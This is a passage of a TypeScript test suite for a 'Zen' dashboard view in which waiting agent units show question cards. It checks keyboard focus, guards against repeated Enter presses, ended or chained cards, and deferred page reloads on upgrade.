	["a question a box forwarded", (r) => r.feed(linkNet({ alerts: [FWD()] })), (r) => r.by((el) => el.getAttribute("role") === "radio")[0]],
];

test("Z-D20: Enter takes a card and the focus lands on its primary control, for every kind of card: the choice, Open the terminal, Trust, Handle, Allow, Confirm, the pair's number; none was focused before", async () => {
	server();
	for (const [name, feed, primary] of KINDS) {
		const r = rig({ start: null });
		feed(r);
		r.z.show();
		await r.settle();
		assert.equal(cards(r), 0, `${name}: it waits`);
		assert.equal(page.focused, undefined, `${name}: nothing took the focus`);
		assert.equal(r.z.key("talk"), true, `${name}: Enter is Zen's`);
		await r.settle();
		assert.equal(cards(r), 1, name);
		assert.ok(primary(r), `${name}: its primary control exists`);
		assert.equal(page.focused, primary(r), `${name}: the focus is on it, so the next Enter presses it`);
	}
});

test("Z-D20: Enter on a card with no control focused (the focus was lost) goes to its primary control; it presses nothing by itself", async () => {
	const sent = server();
	for (const [name, feed, primary] of KINDS) {
		const r = rig({ start: null });
		feed(r);
		r.z.show();
		await r.settle();
		r.z.key("talk");
		await r.settle();
		page.focused = undefined; // a click on the blank space
		assert.equal(r.z.key("talk"), true, `${name}: Enter is Zen's again`);
		assert.equal(page.focused, primary(r), name);
	}
	assert.deepEqual(sent, [], "and no answer was sent by any of them");
});

test("Z-D20: a held Enter does not press the card's button over and over: the key's repeats that arrive on the card are kept from it, a fresh press is not", async () => {
	server();
	const r = rig({ start: null });
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the Enter that takes the card ...
	await r.settle();
	const allow = r.button("Allow")!;
	let prevented = 0;
	allow.bubble("keydown", { key: "Enter", repeat: true, preventDefault: () => void prevented++ }); // ... is held: its repeats arrive on Allow
	assert.equal(prevented, 1, "a repeat of Enter on a button is prevented, so the browser does not click it");
	allow.bubble("keydown", { key: "Enter", repeat: false, preventDefault: () => void prevented++ });
	assert.equal(prevented, 1, "a fresh press is the button's");
	allow.bubble("keydown", { key: " ", repeat: true, preventDefault: () => void prevented++ });
	assert.equal(prevented, 1, "only Enter is held back");
});

test("Z-D20: Enter never fires while a text field has the focus: the companion's box, the head's input, a terminal's sink, a contenteditable keep it for typing, and a button keeps its own", async () => {
	server();
	const r = rig();
	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	assert.equal(cards(r), 0);
	const target = (tag: string, cls: string[] = [], attrs: Record<string, string> = {}) => { const el = new El(tag); el.setAttribute("class", cls.join(" ")); for (const [k, v] of Object.entries(attrs)) el.setAttribute(k, v); return el; };
	const typing = [r.calls.composers.at(-1)!.box, target("input"), target("textarea", ["term-sink"]), target("div", ["term-scroll"]), Object.assign(target("div"), { isContentEditable: true })];
	for (const at of typing) assert.equal(hotkeyOf({ key: "Enter", ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target: at }, false, false, "zen"), undefined, `${at.tagName}: Enter is typing`);
	assert.equal(hotkeyOf({ key: "Enter", ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target: target("button") }, false, false, "zen"), undefined, "a button keeps its Enter");
	assert.equal(hotkeyOf({ key: "Enter", ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target: r.root }, false, false, "zen"), "talk", "off a field, on the companion's screen, Enter takes the card");
	assert.equal(cards(r), 0, "none of those took it");
	assert.equal(r.z.key("talk"), true);
	await r.settle();
	assert.equal(cards(r), 1, "only the key off a field did");
});

test("Z-D20: a card on the screen is never replaced by another one that arrives, a blocking question included: the same card, nothing dissolves, no sound, the cue is not on it", async () => {
	server();
	const r = rig({ start: null });
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	const card = r.by((el) => el.classes.has("zen-card"))[0]!;
	r.feed(waitAndBox(r, true)); // a blocking question arrives behind it
	await r.advance(5 * 60_000);
	assert.equal(r.by((el) => el.classes.has("zen-card"))[0], card, "the same card");
	assert.equal(r.by((el) => el.getAttribute("data-gone") !== null).length, 0, "nothing is dissolving");
	assert.deepEqual(r.calls.sound, ["bowl"], "the one bowl of taking it");
	assert.equal(cueText(r) ?? "", "", "no count on a card (Z-D3)");
	assert.ok(!r.text().includes("waydosoft"), "nothing of the other");
});

test("Z-D20: a card whose question ended while it is shown stays, saying so, with every answer off and one button, Back to the breath; the knock rings once and the card is the boss's to close", async () => {
	server();
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	r.feed(net([unit("a", "working", { name: "ops-main", since: 5 })])); // answered in the terminal
	await r.settle();
	assert.equal(cards(r), 1, "the card is still there");
	assert.ok(r.text().includes("Robot Hand"), "with the question the boss was reading");
	assert.ok(r.text().includes("Already answered elsewhere"), "saying it is settled");
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.ok(r.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled) && r.button("Send answer")!.disabled && r.button("Cancel")!.disabled, "nothing on it answers");
	assert.equal(r.button("Maybe later"), undefined, "Maybe later is not what it offers");
	const close = r.button("Back to the breath")!;
	assert.ok(close && !close.disabled, "one button");
	assert.equal(page.focused, close, "the focus is on it: Enter closes");
	await r.advance(60 * 60_000);
	assert.equal(cards(r), 1, "an hour later it is still there");
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length, 0, "no pause and no circle came by themselves");
});

test("Z-D20: a card that ended is closed by Enter (with the focus anywhere off a control), Esc, and a tap on its button; then the pause, then the breath; the unit's next question waits for Enter", async () => {
	server();
	const ended = async (how: (r: ReturnType<typeof rig>) => unknown) => {
		const r = rig({ start: null });
		r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
		r.z.show();
		await r.settle();
		r.z.key("talk");
		await r.settle();
		r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d2" }) })])); // it asked another question
		await r.settle();
		assert.equal(cards(r), 1, "the card stays");
		assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
		how(r);
		await r.settle();
		assert.equal(cards(r) + r.by((el) => el.getAttribute("data-gone") !== null).length, r.by((el) => el.getAttribute("data-gone") !== null).length, "closed: the card dissolves");
		assert.ok(r.by((el) => el.getAttribute("role") === "img").length, "the pause");
		await r.advance(3100);
		assert.equal(cards(r), 0, "the unit's next question does not take the screen after the pause");
		assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
		r.z.key("talk");
		await r.settle();
		assert.equal(cards(r), 1, "Enter takes it");
		assert.equal(r.by((el) => el.getAttribute("role") === "radio").length, 3, "it is the new question, answerable");
	};
	await ended((r) => { page.focused = undefined; assert.equal(r.z.key("talk"), true); }); // Enter
	await ended((r) => assert.equal(escape(r), true)); // Esc
	await ended((r) => r.button("Back to the breath")!.click()); // a tap
});

test("Z-D20: a card whose unit failed stays with the error line and the low bowl until the boss closes it; one whose snapshot gap ended is live again, with no second sound", async () => {
	server();
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	r.feed(net([unit("a", "error", { name: "ops-main", since: 5 })]));
	await r.advance(60_000);
	assert.equal(cards(r), 1);
	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
	assert.ok(r.button("Back to the breath"));
	const gap = rig({ start: null });
	gap.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
	gap.z.show();
	await gap.settle();
	gap.z.key("talk");
	await gap.settle();
	gap.feed(net([]));
	await gap.settle();
	assert.ok(gap.text().includes("This unit has left"), "a unit missing from a snapshot: the card says so");
	gap.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
	await gap.settle();
	assert.ok(!gap.text().includes("This unit has left") && gap.by((el) => el.getAttribute("role") === "radio").every((o) => !o.disabled) && gap.button("Maybe later"), "the question is listed again: the card is live again");
	assert.deepEqual(gap.calls.sound, ["bowl"], "a unit that left the net rings nothing");
});

test("Z-D20: the terminal layer is never closed or replaced by a card that arrives: the layer stays, nothing is drawn under it, and the card waits for Enter when Zen is back", async () => {
	server();
	const r = rig(); // a session for company: the screen under the layer where a card used to take the screen by itself
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	r.z.terminal({ key: "m" });
	await new Promise((done) => setImmediate(done));
	const layer = () => r.by((el) => el.classes.has("zen-term"))[0];
	assert.ok(layer(), "the layer is on");
	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
	await r.advance(60_000);
	assert.ok(layer(), "the layer stays");
	assert.equal(cards(r), 0, "no card was drawn under it");
	assert.deepEqual(r.calls.sound, [], "no bowl");
	r.by((el) => el.classes.has("zen-term-back"))[0]!.click();
	await r.settle();
	assert.equal(layer(), undefined);
	assert.equal(cards(r), 0, "back in Zen the card still waits for Enter");
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
	r.z.key("talk");
	await r.settle();
	assert.equal(cards(r), 1);
});

test("Z-D20 (box trial C, 10:38): a card that resolves while it queues never renders and never sounds, on the circle or with a session for company; the cue drops to what still waits", async () => {
	server();
	for (const mk of [() => rig({ start: null }), () => rig()]) {
		const r = mk();
		r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })]));
		r.z.show();
		await r.settle();
		assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.");
		for (const gone of [net([unit("m", "working"), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })]), net([unit("m", "working"), unit("a", "working", { since: 5 }), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })])]) {
			r.feed(gone);
			await r.advance(5000);
			assert.equal(cards(r), 0, "the card that resolved while queued is never drawn");
			assert.deepEqual(r.calls.sound, [], "no bowl, no knock");
			assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
			r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })]));
			await r.settle();
		}
		assert.equal(r.by((el) => el.getAttribute("data-gone") !== null).length, 0, "nothing faded in or out");
	}
});

// Review ZNI (fix/zen-never-interrupt, 2026-11-06): F003 the focus of a revived card, F004 an ended wait or pair card, F005 a read-only card's Enter control, F007 the words of an ended card, F009 no redraw per keystroke.
test("ZNI-F003: a card that ended and is listed again is live again with the focus back on its primary control, not on the button that was Back to the breath and is Maybe later now", async () => {
	server();
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	const first = r.by((el) => el.getAttribute("role") === "radio")[0];
	assert.equal(page.focused, first);
	r.feed(net([]));
	await r.settle();
	assert.equal(page.focused, r.button("Back to the breath"), "ended: Enter closes");
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	await r.settle();
	assert.ok(r.button("Maybe later"), "live again");
	assert.equal(page.focused, r.by((el) => el.getAttribute("role") === "radio")[0], "the focus is on the first choice again");
	assert.notEqual(page.focused, r.button("Maybe later"));
});

test("ZNI-F004: a wait card whose question ended turns its buttons off and does not say offline; a pair card's number field goes off; when the palette closes over it the focus is on its one button, where Enter closes it", async () => {
	server();
	const w = rig({ start: null });
	w.feed(waitNet(w));
	w.z.show();
	await w.settle();
	w.z.key("talk");
	await w.settle();
	assert.equal(page.focused, w.button("Ask the tower to rewrite it"));
	assert.equal(w.z.palette(), true, "the palette opens over the card");
	w.feed(net([])); // the wait was answered elsewhere
	await w.settle();
	assert.equal(w.button("Ask the tower to rewrite it"), undefined, "nothing on an ended card answers");
	assert.equal(w.button("Skip"), undefined);
	assert.ok(!w.text().includes("offline"), "an ended card does not say the page is offline");
	assert.equal(w.z.palette(), true, "the palette closes");
	assert.equal(page.focused, w.button("Back to the breath"), "the card's one button has the focus");
	assert.equal(w.z.key("talk"), true, "Enter closes the card");
	await w.settle();
	assert.equal(cards(w), 0);
	const p = rig({ start: null });
	p.feed(linkNet());
	p.z.pairs([PAIR]);
	p.z.show();
	await p.settle();
	p.z.key("talk");
	await p.settle();
	const field = () => p.by((el) => el.classes.has("zen-pair-number"))[0]!;
	assert.ok(!field().disabled);
	assert.equal(p.z.palette(), true);
	p.z.pairs([]);
	await p.settle();
	assert.ok(field().disabled, "the number field is off");
	assert.equal(p.z.palette(), true);
	assert.equal(page.focused, p.button("Back to the breath"), "the focus is on the card's one button");
});

test("ZNI-F005: a read-only dialog's card has an Enter control: Open the terminal, or, for a secret_drop with none, Maybe later; Enter presses it", async () => {
	server();
	const ro = rig({ start: null });
	ro.feed(net([unit("a", "waiting", { since: 5, pending: readonly() })]));
	ro.z.show();
	await ro.settle();
	ro.z.key("talk");
	await ro.settle();
	assert.equal(page.focused, ro.button("Open the terminal"), "the read-only panel's own button");
	const sd = rig({ start: null });
	sd.feed(net([unit("a", "waiting", { since: 5, pending: secret() })]));
	sd.z.show();
	await sd.settle();
	sd.z.key("talk");
	await sd.settle();
	assert.equal(page.focused, sd.button("Maybe later"), "a secret_drop has no control of its own: Maybe later takes the focus");
	page.focused = undefined;
	assert.equal(sd.z.key("talk"), true);
	assert.equal(page.focused, sd.button("Maybe later"), "Enter on the card with the focus lost goes there too");
});

test("ZNI-F007: a unit that left the net or closed says so, not that it was answered elsewhere; a unit that went on says the question was answered elsewhere", async () => {
	server();
	for (const [name, next, said, not] of [["left", net([]), "This unit has left", "Already answered elsewhere"], ["works again", net([unit("a", "working", { since: 5 })]), "Already answered elsewhere", "This unit has left"]] as const) {
		const r = rig({ start: null });
		r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
		r.z.show();
		await r.settle();
		r.z.key("talk");
		await r.settle();
		r.feed(next);
		await r.settle();
		assert.ok(r.text().includes(said) && !r.text().includes(not), name);
		assert.ok(r.button("Back to the breath"), `${name}: closed by the boss`);
	}
});

test("ZNI-F009: a keystroke in the companion's box schedules nothing: no timer, no redraw", async () => {
	const r = rig();
	r.feed(net([unit("t", "working")]));
	r.z.show();
	await r.settle();
	const box = r.calls.composers[0]!.box, before = r.pending().length;
	box.bubble("input", {});
	assert.equal(r.pending().length, before, "nothing is scheduled by typing");
});

// Zen never reloads under the boss (boss ruling 2026-11-06, the page-reload-on-upgrade disposition of ZNR): when the server's build changes, a page showing Zen waits with one quiet line until it is back on the breathing circle with nothing open, or hidden.
const UPDATE = () => m.zen_update();
/** Time passing as a clock does: the fake timers run what is due at the end of one jump, so a poll that sets itself again is walked in steps. */
const pass = async (r: ReturnType<typeof rig>, ms: number) => { for (let left = ms; left > 0; left -= 500) await r.advance(Math.min(500, left)); };
const updateLine = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-update"))[0]?.textContent ?? "";
const upgraded = () => { const go = Object.assign(() => void go.reloads++, { reloads: 0 }); return go; };
test("ZNR upgrade: on the breathing circle with nothing open a new build loads at once, with no line", async () => {
	const r = rig({ start: null, z4b: true });
	r.feed(net([unit("m", "idle")]));
	r.z.show();
	await r.settle();
	const go = upgraded();
	r.z.upgrade(go);
	assert.equal(go.reloads, 1, "the circle is the place to reload");
	assert.equal(updateLine(r), "", "and nothing was said");
});

test("ZNR upgrade: a card, the terminal layer, a session for company, the palette, or the corner menu holds the reload with one quiet line; it loads when Zen is back on the breath with nothing open", async () => {
	const open: [string, (r: ReturnType<typeof rig>) => Promise<unknown>, (r: ReturnType<typeof rig>) => Promise<unknown>][] = [
		["a card", async (r) => (r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })])), r.z.show(), await r.settle(), r.z.key("talk"), await r.settle()), async (r) => (r.button("Maybe later")!.click(), await pass(r, 4_000))],
		["the terminal layer", async (r) => (r.feed(net([unit("a", "idle", { name: "ops-main" })])), r.z.show(), await r.settle(), r.z.terminal({ key: "a" }), await r.settle()), async (r) => (r.button(m.zen_back_title())!.click(), await pass(r, 2_000))],
		["a session for company", async (r) => (r.feed(net([unit("m", "working")])), r.z.show(), await r.settle()), async (r) => (r.z.cycle(1), await pass(r, 2_000))],
		["the palette", async (r) => (r.feed(net([unit("m", "idle")])), r.z.show(), await r.settle(), r.z.palette()), async (r) => (r.z.palette(), await pass(r, 2_000))],
		["the corner menu", async (r) => (r.feed(net([unit("m", "idle")])), r.z.show(), await r.settle(), r.by((el) => el.classes.has("zen-menubtn"))[0]!.click()), async (r) => (r.z.escape({ preventDefault() {} }), await pass(r, 2_000))],
	];
	for (const [name, begin, end] of open) {
		const r = rig({ start: name === "a session for company" ? { key: "m", ws: "w" } : null, z4b: true });
		await begin(r);
		const go = upgraded();
		r.z.upgrade(go);
		assert.equal(go.reloads, 0, `${name}: the page is not reloaded under the boss`);
		assert.equal(updateLine(r), UPDATE(), `${name}: one quiet line says a new version waits`);
		assert.equal(r.root.getAttribute("data-update"), "", `${name}: the page keeps its foot clear for it`);
		await pass(r, 30_000);
		assert.equal(go.reloads, 0, `${name}: however long it stays`);
		r.z.upgrade(go); // a second hello of the same build
		assert.equal(updateLine(r), UPDATE(), `${name}: still one line`);
		await end(r);
		assert.equal(go.reloads, 1, `${name}: back on the breath, the new version loads, once`);
		assert.equal(r.root.getAttribute("data-update"), null, `${name}: and the foot is the page's again`);
		await pass(r, 60_000);
		assert.equal(go.reloads, 1, `${name}: and only once`);
	}
});

test("ZNR upgrade: a hidden page loads the new version at once, held or not; Zen being hidden (Standard shown) does too", async () => {
	const held = rig({ start: null });
	held.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	held.z.show();
	await held.settle();
	held.z.key("talk");
	await held.settle();
	const go = upgraded();
	held.z.upgrade(go);
	assert.equal(go.reloads, 0);
	page.hidden = true;
	held.z.visible(false);
	assert.equal(go.reloads, 1, "the page went hidden: nobody is being interrupted");
	const hid = rig({ start: null });
	hid.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	hid.z.show();
	await hid.settle();
	hid.z.key("talk");
	await hid.settle();
	const second = upgraded();
	hid.z.upgrade(second);
	hid.z.hide();
	assert.equal(second.reloads, 1, "Zen left for Standard: Standard reloads at once");
	const away = rig({ start: null });
	away.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	away.z.show();
	await away.settle();
	away.z.key("talk");
	await away.settle();
	page.hidden = true;
	const third = upgraded();
	away.z.upgrade(third);
	assert.equal(third.reloads, 1, "a hello that arrives on a hidden page loads it at once");
	page.hidden = false;
});

test("ZNR upgrade: the pause after an answer is not the breath yet: the line shows on it, and the page loads when the circle is back", async () => {
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	const go = upgraded();
	r.z.upgrade(go);
	r.button("Maybe later")!.click();
	await r.advance(100);
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length > 0 && go.reloads === 0, true, "the pause's circle is on, and nothing reloaded");
	assert.equal(updateLine(r), UPDATE(), "the line is there on the pause");
	await pass(r, 4_000);
	assert.equal(go.reloads, 1);
});

// --- Z-D22 (docs/specs/2026-11-01-zen-view.md, Chain; boss 2026-11-07): once the boss has taken a card and answered it, the next one that waits is taken straight after the outcome ---------------------------------

const DWELL = 400;
/** Three cards of units that wait, a, b, c, in the order they come (the oldest first); `gone` lists the ones that have stopped waiting by now. */
const trio = (gone: string[] = []) => net(["a", "b", "c"].map((k, i) => unit(k, gone.includes(k) ? "working" : "waiting", { name: `ops-${k}`, since: 5 + i, ...(gone.includes(k) ? {} : { pending: { ...select({ dialog: `d${k}` }), callId: `c-${k}` } }) })));
const liveCard = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-card") && el.getAttribute("data-gone") === null)[0];
const radios = (r: ReturnType<typeof rig>) => liveCard(r)!.all((el) => el.getAttribute("role") === "radio");
/** The boss answers the card on the screen (the first choice, Send) and the server accepts it: the knock and the outcome. */
async function answerCard(r: ReturnType<typeof rig>) {
	radios(r)[0]!.click();
	r.button("Send answer")!.click();
	await r.reply({ outcome: "accepted" });
}
async function chainRig(o: { remind?: boolean } = {}) {
	server();
	const r = rig({ start: null });
	r.feed(trio());
	r.z.show();
	await r.settle();
	assert.equal(cueText(r), "3 cards wait for Enter. No rush, when you're ready.");
	r.z.key("talk"); // the boss takes the first card
	await r.settle();
	return r;
}

test("Z-D22: after the boss answers a card the next waits no pause and no breath: the outcome shows 1.2 s, then the next card is drawn with the bowl and the focus on its first choice; the last answer is the pause", async () => {
	const r = await chainRig();
	assert.deepEqual(whoIs(r), ["ops-a"]);
	await answerCard(r);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	r.feed(trio(["a"])); // the server's snapshot: a is answered
	await r.advance(OUTCOME - 100);
	assert.deepEqual(whoIs(r), ["ops-a"], "the outcome still shows");
	await r.advance(200);
	assert.deepEqual(whoIs(r), ["ops-b"], "b is the card on the screen");
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length, 0, "the breathing circle never came");
	assert.deepEqual(r.calls.sound, ["bowl", "knock", "bowl"], "b rings as a taken card does: the bowl, and no knock besides");
	assert.equal(page.focused, radios(r)[0], "the focus is on b's first choice, as for any taken card");
	assert.equal(r.by((el) => el.getAttribute("aria-live") === "polite")[0]!.textContent, "ops-b wants to ask you");
	assert.equal(cueText(r) ?? "", "", "a card on the screen shows no cue");
	// b answered (after the 400 ms the card holds off the key and the tap that answered a): c follows, then the queue is empty and the pause comes
	await r.advance(DWELL + 1);
	await answerCard(r);
	r.feed(trio(["a", "b"]));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-c"]);
	await r.advance(DWELL + 1);
	await answerCard(r);
	r.feed(trio(["a", "b", "c"]));
	await r.advance(OUTCOME + 100);
	assert.equal(cards(r), 0);
	assert.equal(r.by((el) => el.getAttribute("role") === "img")[0]?.getAttribute("aria-label"), "Take a breath", "the queue is empty: the pause");
	await r.advance(PAUSE + 100);
	assert.equal(cueText(r) ?? "", "", "and then the breath, nothing waits");
	assert.deepEqual(r.calls.sound, ["bowl", "knock", "bowl", "knock", "bowl", "knock"]);
});

test("Z-D22: the cue counts one fewer for every card the chain takes, and Esc (Not now) is not a chain: the breath returns with the others counted", async () => {
	const r = await chainRig();
	r.z.escape({ preventDefault() {} }); // Not now on a (a select with no Cancel)
	await r.advance(PAUSE + 100);
	assert.equal(cards(r), 0, "no card follows Not now");
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length >= 1, true, "the breath");
	assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.", "a rests; b and c wait for Enter");
	r.z.key("talk");
	await r.settle();
	assert.deepEqual(whoIs(r), ["ops-b"]);
	await r.advance(DWELL + 1);
	await answerCard(r);
	r.feed(trio(["b"]));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-c"], "b's answer chains to c");
});

test("Z-D22: closing a card that ended elsewhere, gone, or in error is not a chain: its Back to the breath returns to the breath, with the cue counting the cards that wait", async () => {
	for (const [name, ends] of [["elsewhere", () => trio(["a"])], ["gone", () => net([unit("b", "waiting", { name: "ops-b", since: 6, pending: { ...select({ dialog: "db" }), callId: "c-b" } }), unit("c", "waiting", { name: "ops-c", since: 7, pending: { ...select({ dialog: "dc" }), callId: "c-c" } })])], ["error", () => net(["a", "b", "c"].map((k, i) => unit(k, k === "a" ? "error" : "waiting", { name: `ops-${k}`, since: 5 + i, ...(k === "a" ? {} : { pending: { ...select({ dialog: `d${k}` }), callId: `c-${k}` } }) })))]] as const) {
		const r = await chainRig();
		r.feed(ends());
		await r.advance(OUTCOME * 5);
		assert.deepEqual(whoIs(r), ["ops-a"], `${name}: the card stays until the boss closes it`);
		r.button("Back to the breath")!.click();
		await r.advance(PAUSE + 100);
		assert.equal(cards(r), 0, `${name}: closing it is the breath, not the next card`);
		assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.", name);
	}
});

test("Z-D22: a card that resolved while it queued is never drawn: the chain goes to the next one", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a", "b"])); // b was answered in its terminal meanwhile
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-c"], "b is skipped");
	assert.deepEqual(r.calls.sound, ["bowl", "knock", "bowl"], "no card, no bowl, and no knock for b");
});

test("Z-D22: the card the chain takes ignores the Enter that answered the card before it: a repeating Enter, a keydown that began before it was drawn, and any Enter within 400 ms of it being drawn; a fresh Enter after that is the button's", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a"]));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-b"]);
	const choice = radios(r)[0]!;
	let prevented = 0, stopped = 0; // the panel's own keys prevent Enter's default too (askkeys.ts), so the layer's guard is what stops the event: it never reaches the panel
	const key = (name: string, extra: object = {}) => choice.bubble("keydown", { key: name, repeat: false, timeStamp: Infinity, preventDefault: () => void prevented++, stopPropagation: () => void stopped++, ...extra });
	const swallowed = (act: () => void) => { [prevented, stopped] = [0, 0]; act(); return stopped === 1 && prevented >= 1; };
	const enter = (extra: object = {}) => key("Enter", extra);
	assert.equal(swallowed(() => enter()), true, "an Enter at the moment it is drawn is kept from it (and from the panel's own keys under it)");
	await r.advance(DWELL - 100);
	assert.equal(swallowed(() => enter()), true, "so is one 300 ms on: the second tap of a double Enter");
	assert.equal(swallowed(() => enter({ repeat: true })), true, "a repeating Enter is kept from it");
	await r.advance(101);
	assert.equal(swallowed(() => enter()), false, "a fresh Enter after the 400 ms is the card's own");
	assert.equal(swallowed(() => enter({ repeat: true })), true, "a repeating one still is not");
	assert.equal(swallowed(() => enter({ timeStamp: -1 })), true, "nor is a keydown that began before the card was drawn");
	assert.equal(swallowed(() => key("ArrowDown")), false, "only Enter is held back");
	assert.deepEqual(r.calls.posts.map((p) => p.key), ["a"], "and no answer of b's was sent by any of them");
});

test("Z-D22: a tap on the card the chain takes, within 400 ms of it being drawn, presses nothing; a tap after that does; a tap that began inside the window and ends after it presses nothing", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a"]));
	await r.advance(OUTCOME + 100);
	const choice = radios(r)[0]!;
	let prevented = 0, stopped = 0;
	const hit = (type: string) => choice.bubble(type, { isTrusted: true, detail: 1, preventDefault: () => void prevented++, stopPropagation: () => void stopped++ }); // a tap's click has a detail of 1 (a keyboard's activation has 0)
	hit("click");
	assert.deepEqual([prevented, stopped], [1, 1], "a tap at once");
	[prevented, stopped] = [0, 0];
	await r.advance(DWELL - 50);
	hit("click");
	assert.deepEqual([prevented, stopped], [1, 1], "a tap at 350 ms");
	[prevented, stopped] = [0, 0];
	hit("pointerdown"); // a press at 350 ms ...
	await r.advance(100);
	hit("click"); // ... whose release comes at 450 ms
	assert.deepEqual([prevented, stopped], [1, 1], "a tap that began in the window is the window's");
	[prevented, stopped] = [0, 0];
	hit("pointerdown");
	hit("click");
	assert.deepEqual([prevented, stopped], [0, 0], "a tap after it is the card's own");
	[prevented, stopped] = [0, 0];
	choice.bubble("click", { isTrusted: false, preventDefault: () => void prevented++, stopPropagation: () => void stopped++ });
	assert.deepEqual([prevented, stopped], [0, 0], "a click the layer's own code makes (Back to the breath, Not now) is not a tap");
});

test("Z-D22: Esc within 400 ms of the card the chain takes is kept from it (a cancel is an answer); after that it is Not now, as before", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a"]));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-b"]);
	let prevented = 0;
	assert.equal(r.z.escape({ preventDefault: () => void prevented++ }), true, "Esc is Zen's");
	assert.deepEqual([prevented, whoIs(r)], [1, ["ops-b"]], "and it does nothing to the card");
	await r.advance(DWELL + 1);
	r.z.escape({ preventDefault() {} });
	await r.advance(PAUSE + 100);
	assert.equal(cards(r), 0, "later it is Not now");
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "c still waits; b rests");
});

test("Z-D22: a card taken by Enter is not guarded: the boss's own Enter, 100 ms later, acts as before", async () => {
	const r = await chainRig();
	const choice = radios(r)[0]!;
	let stopped = 0;
	choice.bubble("keydown", { key: "Enter", repeat: false, timeStamp: Infinity, preventDefault() {}, stopPropagation: () => void stopped++ });
	assert.equal(stopped, 0, "the guard is the chained card's alone");
	assert.equal(r.z.escape({ preventDefault() {} }), true);
	await r.advance(PAUSE + 100);
	assert.equal(cards(r), 0, "and Esc at once is Not now");
});

test("Z-D22: with the terminal layer open over the card (an answer that opened a pane) the chain does not draw the next card under it: the pause, the breath, and the cue", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.z.terminal({ key: "a" } as never); // the answer's step opens the layer
	await r.settle();
	r.feed(trio(["a"]));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), [], "no card is drawn under the layer");
	await r.advance(PAUSE + 100);
	assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.", "b and c wait for Enter");
});

test("Z-D22: a page nobody is looking at is reminded of each card once: the chain's card was reminded while it queued and is not reminded again after it is drawn", async () => {
	const r = await chainRig();
	assert.deepEqual(r.calls.remind, [], "the page had the focus");
	page.focus = false;
	r.feed(trio()); // a snapshot: the page is away, so the cards that wait are reminded, once each
